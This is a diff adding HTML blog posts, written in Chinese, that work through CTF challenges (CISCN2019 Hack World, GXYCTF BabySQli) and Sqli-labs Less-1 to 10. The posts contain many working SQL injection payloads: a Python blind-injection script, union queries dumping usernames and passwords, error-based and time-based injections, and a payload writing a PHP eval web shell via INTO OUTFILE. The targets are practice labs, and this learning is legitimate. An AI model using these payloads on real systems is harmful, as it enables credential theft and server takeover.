@@ -158,6 +158,566 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/" class="post-title-link" itemprop="url">CISCN2019-华北赛区-Day2-Web1-Hack-World</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-01-30 09:23:27 / 修改时间：10:15:08" itemprop="dateCreated datePublished" datetime="2021-01-30T09:23:27+08:00">2021-01-30</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><h6 id="1-题目：数字型注入-脚本"><a href="#1-题目：数字型注入-脚本" class="headerlink" title="1.题目：数字型注入+脚本"></a>1.题目：数字型注入+脚本</h6><h6 id="2-过程"><a href="#2-过程" class="headerlink" title="2.过程"></a>2.过程</h6><p>把表名和列名都列出来了，就等你注了……</p>
+<p>但是好多字符包括空格都给过滤了，试好久也试不出来……</p>
+<p>但是：1/1、4/2是可以出结果的，也就是说，可以借助逻辑判断返回1和0，判断逻辑的真假。</p>
+<p>借助之前sqli学到的布尔盲注：</p>
+<p><img src="/images/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210126103939343.png" alt="image-20210126103939343"></p>
+<p>id=if(length((select(flag)from(flag)))=42,1,0)</p>
+<p><img src="/images/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210130095117383.png" alt="image-20210130095117383"></p>
+<p>说明flag有42个字符，这要一个一个注……很多题解上都用了脚本，反正时间充裕，我就针对python脚本学习了下</p>
+<p>​    1.requests模块通过POST请求传参</p>
+<p>​    2.字符串拼接变量</p>
+<p>​    3.处理requests请求结果</p>
+<p>​    4.复习Acwing的二分法模板：<a target="_blank" rel="noopener" href="https://www.acwing.com/problem/content/1229/">1227. 分巧克力</a></p>
+<p>​    5.time.sleep()延时处理防止频繁访问导致网页不正常回显产生坏点（得益于sql延时注入了解了sleep函数）</p>
+<p>其实学的写的都挺粗糙的……最后也调试了好久，不过看见脚本成功运行还是很开心的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://2bd5e0bf-74ef-4b72-90b8-315541a82d9d.node3.buuoj.cn/&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">43</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="built_in">int</span>((l+r+<span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        <span class="built_in">id</span> = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#x27;</span>+x+<span class="string">&#x27;,1))&gt;=&#x27;</span>+y+<span class="string">&#x27;,1,0)&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url=url,data=<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid<span class="number">-1</span></span><br><span class="line">        time.sleep(<span class="number">0.03</span>)</span><br><span class="line">    flag+=(<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>0.03还是比较稳定、比较快的，出的flag也比较正常。</p>
+<p><img src="/images/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/image-20210130100902831.png" alt="image-20210130100902831"></p>
+<p>emmm，这样我就有自己的布尔盲注脚本了。</p>
+<p>🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗🆗</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/" class="post-title-link" itemprop="url">极客大挑战-2019-Upload</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-01-28 14:31:38 / 修改时间：16:59:28" itemprop="dateCreated datePublished" datetime="2021-01-28T14:31:38+08:00">2021-01-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><h6 id="1-题目：上传绕过"><a href="#1-题目：上传绕过" class="headerlink" title="1.题目：上传绕过"></a>1.题目：上传绕过</h6>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/01/28/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/" class="post-title-link" itemprop="url">极客大挑战-2019-Http</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-01-27 15:41:47 / 修改时间：15:50:50" itemprop="dateCreated datePublished" datetime="2021-01-27T15:41:47+08:00">2021-01-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h4><h6 id="1-题目：Http头知识"><a href="#1-题目：Http头知识" class="headerlink" title="1.题目：Http头知识"></a>1.题目：Http头知识</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p><img src="D:\HexoBlog\source\images\极客大挑战-2019-Http\image-20210127154300675.png" alt="image-20210127154300675"></p>
+<p>查看源码可以看到有一个Secret.php页面</p>
+<p><img src="D:\HexoBlog\source\images\极客大挑战-2019-Http\image-20210127154359878.png" alt="image-20210127154359878"></p>
+<p>用burpsuit修改http头：</p>
+<p>referrer：当一个用户点击当前页面中的一个链接，然后跳转到目标页面时，目标页面会收到一个信息，即用户是从哪个源链接跳转过来的。</p>
+<p><img src="D:\HexoBlog\source\images\极客大挑战-2019-Http\image-20210127154536344.png" alt="image-20210127154536344"></p>
+<p>User-Agent中记录了使用的浏览器信息</p>
+<p><img src="D:\HexoBlog\source\images\极客大挑战-2019-Http\image-20210127154901598.png" alt="image-20210127154901598"></p>
+<p>也就是要是本地ip</p>
+<p>X-Forwarded-For 是一个 HTTP 扩展头部，可用来伪造来源IP</p>
+<p><img src="D:\HexoBlog\source\images\极客大挑战-2019-Http\image-20210127155029063.png" alt="image-20210127155029063"></p>
+<p><img src="D:\HexoBlog\source\images\极客大挑战-2019-Http\image-20210127155040668.png" alt="image-20210127155040668"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/27/GXYCTF2019-BabySQli/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/27/GXYCTF2019-BabySQli/" class="post-title-link" itemprop="url">GXYCTF2019-BabySQli</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-01-27 11:42:17 / 修改时间：15:12:43" itemprop="dateCreated datePublished" datetime="2021-01-27T11:42:17+08:00">2021-01-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><h6 id="1-题目：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！"><a href="#1-题目：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！" class="headerlink" title="1.题目：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！"></a>1.题目：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</h6><h6 id="2-过程："><a href="#2-过程：" class="headerlink" title="2.过程："></a>2.过程：</h6><p>可以猜到username是admin，只会提示wrong pass……那就只能在username注入</p>
+<p><img src="/images/GXYCTF2019-BabySQli/image-20210127114903957.png" alt="image-20210127114903957"></p>
+<p>POST……用burpsuit</p>
+<p><img src="/images/GXYCTF2019-BabySQli/image-20210127115020460.png" alt="image-20210127115020460"></p>
+<p>发现有一段密文：MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
+<p>试试解密：先base32，再base64：<strong>select * from user where username = ‘$name’</strong></p>
+<p>不清楚有什么用欸……查一下sql里的MD5加密语句：</p>
+<p><img src="/images/GXYCTF2019-BabySQli/image-20210127115316636.png" alt="image-20210127115316636"></p>
+<p>这个应该很接近题目了。网上很多猜测源码的……GitHub上有源码：</p>
+<p><img src="/images/GXYCTF2019-BabySQli/image-20210127150627305.png" alt="image-20210127150627305"></p>
+<p>只查了一行，所以用union的特性，构造：</p>
+<p>name=3’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’–+&amp;pw=123</p>
+<p>此时获取的是union的虚表，select ‘admin’,0,’202cb962ac59075b964b07152d234b70’ 是不行的</p>
+<p>第二列应该是username，第三列是password；即arr[1]和arr[2]。</p>
+<p>202cb962ac59075b964b07152d234b70即123的MD5编码……得flag</p>
+<p><img src="/images/GXYCTF2019-BabySQli/image-20210127151238520.png" alt="image-20210127151238520"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/25/Sqli-labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/25/Sqli-labs/" class="post-title-link" itemprop="url">Sqli-labs</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-25 09:14:28" itemprop="dateCreated datePublished" datetime="2021-01-25T09:14:28+08:00">2021-01-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-06 17:19:02" itemprop="dateModified" datetime="2021-03-06T17:19:02+08:00">2021-03-06</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p>先用or 1=1，只显示一条结果，应该有limit语句……</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+</span><br></pre></td></tr></table></figure>
+
+<p>判断列数以便使用联合查询，发现有三列。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sqli-labs/image-20210125092719056.png" alt="image-20210125092719056"></p>
+<p>正常回显，当前库是security。</p>
+<p>查表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sqli-labs/image-20210125094000614.png" alt="image-20210125094000614"></p>
+<p>查字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),3--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/Sqli-labs/image-20210125094309642.png" alt="image-20210125094309642"></p>
+<p>可以查询用户名与密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sqli-labs/image-20210125094559177.png" alt="image-20210125094559177"></p>
+<p>Less-1结束……</p>
+<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>?id=1 and 1=2 无回显，数值型注入……</p>
+<p>order by 3 即有三列。</p>
+<p>用的好像还是security库……</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sqli-labs/image-20210125100314265.png" alt="image-20210125100314265"></p>
+<p>em，和Less-1差不多……</p>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>?id=1’回显有点奇怪……</p>
+<p><img src="/images/Sqli-labs/image-20210125100534807.png" alt="image-20210125100534807"></p>
+<p>那一部分应该是：**’1”) LIMIT 0,1**，应该是id=(‘$id’) </p>
+<p>?id=1’)–+   回显正常</p>
+<p>?id=1’) order by 3–+ 有3列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39;) union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Sqli-labs/image-20210125101316132.png" alt="image-20210125101316132"></p>
+<p>OK</p>
+<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>?id=1’’’’’’’’’’’’’’’’’’–+123156hbhj–+</p>
+<p>没有任何的报错……应该是都被认为是字符了</p>
+<p>?id=1” 报错：</p>
+<p><img src="/images/Sqli-labs/image-20210125102444211.png" alt="image-20210125102444211"></p>
+<p>这里大概是：id=(“$id”)</p>
+<p>?id=1”)–+  回显正常</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&quot;) union select 1,(select group_concat(username,&quot;-&quot;,password) from security.users),3--+</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以了……</p>
+<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p><img src="/images/Sqli-labs/image-20210125102858654.png" alt="image-20210125102858654"></p>
+<p>emm……不太懂，查一波。</p>
+<p>这波大概是盲注，盲注也有很多种……</p>
+<p><img src="/images/Sqli-labs/image-20210125103101029.png" alt="image-20210125103101029"></p>
+<p><img src="/images/Sqli-labs/image-20210126103939343.png" alt="image-20210126103939343"></p>
+<p>?id=1’ and left(database(),1)=’s’–+  //一位一位判断库名</p>
+<p>?id=1’ and if(length(database())=8,sleep(1),1)–+  //利用时间延迟判断猜测是否正确3</p>
+<p>结合burpsuit可以更方便一些……</p>
+<p>还有更强的方法：双查询联合注入</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lixiangminghate/article/details/80466257">详细讲解双查询注入csdn</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BloodZero/p/4660971.html">双查询注入（大佬）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">sql注入之双查询注入（简书）</a></p>
+<p>这些文章都尽可能的解释了这个方法……</p>
+<p><a target="_blank" rel="noopener" href="https://www.1keydata.com/cn/sql/sql-groupby.php">group by 的说明</a></p>
+<p><img src="/images/Sqli-labs/image-20210126114614150.png" alt="image-20210126114614150"></p>
+<p>理解一波，不知道对不对……</p>
+<p>group by 读取时，查找字段名中是否有key，没有则插入。但是每次读取判断时，floor(random(0)*2)是随机的0或1……所以概率出现重复插入的情况，此时会发生报错，报错内容回显出database()的内容。</p>
+<p>eg：*<strong>?id=’ union select count(*),count(*),concat(‘<del>‘,(select database()),’</del>‘,floor(rand()*2)) as a from information_schema.tables group by a–+*</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/sql/sql_func_count_ast.asp">那这个count(*)又有什么作用……</a></p>
+<p>本以为是像select 1，2，3一样占行数的……但改成1和2又会不起效果……</p>
+<p>必须有一个count(*)才行……</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">这个看着差不多</a>，结合自己理解一波：</p>
+<p><img src="/images/Sqli-labs/image-20210126170317765.png" alt="image-20210126170317765"></p>
+<p><img src="/images/Sqli-labs/image-20210126170944295.png" alt="image-20210126170944295"></p>
+<p>先以语句结果去寻找，找不到，插入语句重新计算得到的结果。这样的话，表至少有两列，这个方法才能成功（至少遍历两次才能产生冲突）。若第二次找不到，则插入新结果，此时还要计算对应的count，遍历数据。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aspirant/p/8983901.html">SQL有三个类型的索引，唯一索引 不能有重复，但聚集索引，非聚集索引可以有重复</a></p>
+<p>主键key默认是唯一索引。count的再次遍历发现了主键索引的冲突，报错。大概是这样？……</p>
+<p>还有，再查当前库时，可以用：**?id=-1’ union select n from n–+**</p>
+<p><img src="/images/Sqli-labs/image-20210126172631743.png" alt="image-20210126172631743"></p>
+<p>直接得到security……不过好像只能干这个……</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,count(\*),concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<p>查当前库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select count(\*),1, **concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit x,1)**,&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<p>修改x可以查各个表名</p>
+<blockquote>
+<p>?id=-1’ union select count(*),1, <strong>concat(‘~‘,(select column_name from information_schema.columns where table_name=’users’ limit x,1)</strong>,’~’,floor(rand()*2)) as a from information_schema.tables group by a–+</p>
+</blockquote>
+<p>修改x可以查各个列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat_ws(&#39;[&#39;,password,username) from users limit x,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<p>修改x可以查各个字段</p>
+<p>百分百成功(大概)：rand()里面的seed调为小于等于0，对于指定的seed，rand的值相同。但是是什么，为什么我都不知道……我也是试出来的，也查不清楚……</p>
+<p>回来再试试~~</p>
+<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>?id=1” 报错</p>
+<p><img src="/images/Sqli-labs/image-20210126181005116.png" alt="image-20210126181005116"></p>
+<p>?id=1”–+成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&quot; union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit x,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
+
+<p>查表</p>
+<p>差不多……</p>
+<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p><img src="/images/Sqli-labs/image-20210126181512238.png" alt="image-20210126181512238"></p>
+<p>outfile又不懂辽……</p>
+<p>?id=1’–+ 只提示有错误……没有错误的回显了。查资料辽。</p>
+<p>?id=1‘)) and (select count(*) from mysql.user)&gt;0 –+ </p>
+<p>判断有没有文件写入权限，不过只显示有错误，不知道是不是语法错误……</p>
+<p>?id=1’)) and if((select count(*) from mysql.user)&gt;0,1,1) –+ 进入，应该是没有写入/写出权限</p>
+<p>关于file权限：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 必须有权限读取并且文件必须完全可读 </span><br><span class="line">2 目的文件必须在服务器上 </span><br><span class="line">3 必须指定文件完整的路径 </span><br><span class="line">4 欲读取文件必须小于 max_allowed_packet</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>由于phpstudy的设置，所以在网站上操作没有权限，好像是secure_file_priv需要设置一下……</p>
+<p>更改之后：?id=1’)) and if((select count(*) from mysql.user)&gt;0,1,0) –+ 成功进入</p>
+<p>导出文件：?id=1’)) union select 1,database(),user() into outfile “D:\pp.txt”–+ 报错但文件成功导出。</p>
+<p><img src="/images/Sqli-labs/image-20210126224148354.png" alt="image-20210126224148354"></p>
+<p>*<em>?id=’)) union select * from users into outfile “D:\apap.txt”–+*</em></p>
+<p><img src="/images/Sqli-labs/image-20210126230104531.png" alt="image-20210126230104531"></p>
+<p>OK。</p>
+<p>导入文件：</p>
+<p>?id=1’)) union select 1,2,’&lt;?php @eval($_POST[“b”])?&gt;‘ into outfile “D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\b.php”–+</p>
+<blockquote>
+<p>反斜杠“\”是Windows系统文件目录结构使用的分隔符，如：D:\我的文档。只有 windows 支持反斜杠路径符 \ ，而unix支持 /</p>
+<p>但是我们还应该知道 \ 也是转义字符，在url中他会当成转义字符处理，所以我们用 \ 对反斜杠进行转义，那么结果就变成了一个反斜杠</p>
+</blockquote>
+<p><img src="/images/Sqli-labs/image-20210126225640997.png" alt="image-20210126225640997"></p>
+<p>成功连接。</p>
+<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>这次彻底没有任何错误回显了……</p>
+<p>只能一位一位注…同Less-5的第一种方法：</p>
+<p>?id=1’ and left(database(),1)=’s’–+  //一位一位判断库名</p>
+<p>?id=1’ and if(length(database())=8,sleep(1),1)–+  //利用时间延迟判断猜测是否正确</p>
+<p>结合burpsuit可以更方便一些……不用bp也可以用二分法。</p>
+<p><img src="/images/Sqli-labs/image-20210126103939343.png" alt="image-20210126103939343"></p>
+<p>?id=1’ and if(left((select table_name from information_schema.tables where table_schema=database() limit x,1),1)=’r’ , sleep(1), 1) –+   //查表</p>
+<p>?id=1’ and if(left((select column_name from information_schema.columns where table_name=’users’ limit x,1),1)=’a’, sleep(1), 1) –+   //查列</p>
+<p>?id=1’ and if(left((select password from users limit 0,1),4)=’dumb’ , sleep(1), 1) –+    //查数据</p>
+<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p><img src="/images/Sqli-labs/image-20210126232436182.png" alt="image-20210126232436182"></p>
+<p>em，和Less-8是一样的。</p>
+<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>不论怎么打，都是“You are in”……</p>
+<p>源代码：</p>
+<p><img src="/images/Sqli-labs/image-20210126233825832.png" alt="image-20210126233825832"></p>
+<p>$id的值左右拼接了“ ”；这样处理的话只能用and去判断</p>
+<p>所以用双引号就行了……其他和Less-8是一样的。</p>
